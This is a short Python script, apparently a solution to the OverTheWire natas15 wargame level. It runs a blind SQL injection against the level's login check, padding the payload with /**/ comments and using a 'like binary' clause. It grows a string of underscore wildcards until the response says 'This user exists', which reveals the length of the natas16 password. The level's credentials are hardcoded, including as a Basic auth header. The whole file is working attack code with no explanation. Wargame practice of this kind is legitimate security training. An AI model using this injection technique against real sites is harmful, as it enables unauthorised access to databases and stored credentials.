import urllib.request
import re
regex = 'This user exists'
username = "natas15"
password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
url = 'http://natas15.natas.labs.overthewire.org/index.php?debug&username=natas16"/**/and/**/password/**/like/**/binary/**/"'

password = '_'
while True:
    req = urllib.request.Request(url + password, None,
                                 {'Authorization': 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg'})
    response = urllib.request.urlopen(req)
    responseData = str(response.read(), 'utf-8')
    regexSearch = re.search(regex, responseData)
    if regexSearch is not None:
        print("Password length is " + str(len(password)))
        break
    print('Password length is longer than ' + str(len(password)))
    password += '_'